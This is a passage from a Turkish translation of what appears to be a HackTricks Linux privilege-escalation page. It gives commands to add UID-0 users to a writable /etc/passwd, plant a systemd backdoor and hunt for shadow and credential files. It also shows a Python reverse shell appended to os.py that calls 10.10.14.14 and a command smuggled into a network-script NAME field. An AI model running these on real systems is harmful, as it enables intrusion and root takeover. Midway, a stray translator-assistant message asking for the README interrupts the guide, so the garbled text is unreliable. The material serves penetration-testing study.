Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesi ile ssh-agent forwarding'i **izin verecek** veya **engelleyecek** şekilde yapılandırabilir (varsayılan izinlidir).

Eğer bir ortamda Forward Agent yapılandırılmış olduğunu görürseniz aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında yürütülen **betiklerdir**. Bu nedenle, bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **hassas detaylar**.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği olabilir. Bu nedenle **hepsini bulun** ve **okuyup okuyamadığınızı kontrol edin** — dosyaların içinde **if there are hashes** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasının içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Dosyayı çevirmem için src/linux-hardening/privilege-escalation/README.md içeriğini gönderir misiniz? Mevcut dosya içeriği olmadan doğru ve tam çeviri yapamam.

Ayrıca "Then add the user `hacker` and add the generated password." ifadesiyle ne istediğinizi netleştirmek istiyorum:
- README.md içinde bir bölüm ekleyip oraya `hacker` kullanıcısını ekleme komutlarını ve üretilmiş parola bilgisini mi koymamı istiyorsunuz, yoksa sisteminizde gerçek kullanıcı oluşturup parola atamamı mı bekliyorsunuz? (Ben sistem üzerinde doğrudan işlem yapamam — ancak gerekli komutları ve rastgele oluşturulmuş bir parola sağlayabilirim.)
- Parolanın uzunluğu ve karmaşıklığıyla ilgili tercihiniz var mı? (ör. 16 karakter, özel karakterler dahil)

İçeriği gönderirseniz çeviriyi yapar, isteğinize göre README’ye `hacker` kullanıcısı ekleme talimatını ve üretilmiş parolayı eklerim.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumundadır, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir dahaki başlatılışında çalıştırılacaktır.

### Klasörleri Kontrol Edin

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifre içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin, şifre içerebilecek **birkaç olası dosyayı** arar.\
**Kullanabileceğiniz başka bir ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bilgisayarda saklanan çok sayıda şifreyi geri almak üzere kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Eğer logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, bazı "**bad**" yapılandırılmış (backdoored?) **audit logs**, bu yazıda açıklandığı gibi audit logları içine **şifreleri kaydetme** imkanı verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Logları okumak için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten faydalı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca adı veya içeriği içinde "**password**" kelimesi geçen dosyaları kontrol etmelisiniz ve loglar içinde IP'leri ve e-postaları ya da hash regex'lerini de kontrol edin.\
Burada bunların hepsinin nasıl yapılacağını listelemeyeceğim, ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **python libraries**i değiştirebiliyorsanız, OS kütüphanesini değiştirip backdoorlayabilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id_ arasında boşluk olduğuna dikkat edin_)

### **init, init.d, systemd, and rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için komut dosyalarının bulunduğu yerdir; klasik Linux servis yönetim sistemidir. İçinde servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için kullanılan komut dosyaları bulunur. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif bir yol `/etc/rc.d/init.d`'dir.

Öte yandan, `/etc/init` Ubuntu tarafından getirilen Upstart ile ilişkilidir ve servis yönetimi görevleri için konfigürasyon dosyalarını kullanır. Upstart'a geçişe rağmen, SysVinit betikleri uyumluluk katmanı nedeniyle Upstart konfigürasyonlarıyla birlikte kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, otomatik bağlama (automount) yönetimi ve sistem durumunun anlık görüntülerini alma gibi gelişmiş özellikler sunan modern bir initialization ve servis yöneticisidir. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` altında, yönetici değişiklikleri için `/etc/systemd/system/` altında organize eder ve sistem yöneticiliği sürecini kolaylaştırır.

## Diğer Taktikler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden Kaçış


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks tipik olarak privileged kernel fonksiyonlarını userspace manager'a açmak için bir syscall'u hook'lar. Zayıf manager kimlik doğrulaması (ör. FD-order'a dayalı signature kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-root'lu cihazlarda root'a yükselmesine izin verebilir. Daha fazla bilgi ve exploitation detayları için bakınız:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex tabanlı service discovery, process komut satırlarından bir binary path çıkarabilir ve bu binary'yi -v ile ayrıcalıklı bir bağlamda çalıştırabilir. İzin verici desenler (ör. \S kullanımı) yazılabilir konumlardaki (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve bunun sonucunda root olarak çalıştırma (CWE-426 Untrusted Search Path) gerçekleşebilir.

Daha fazla bilgi ve diğer discovery/monitoring yığınlarına uygulanabilir genelleştirilmiş deseni görmek için:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
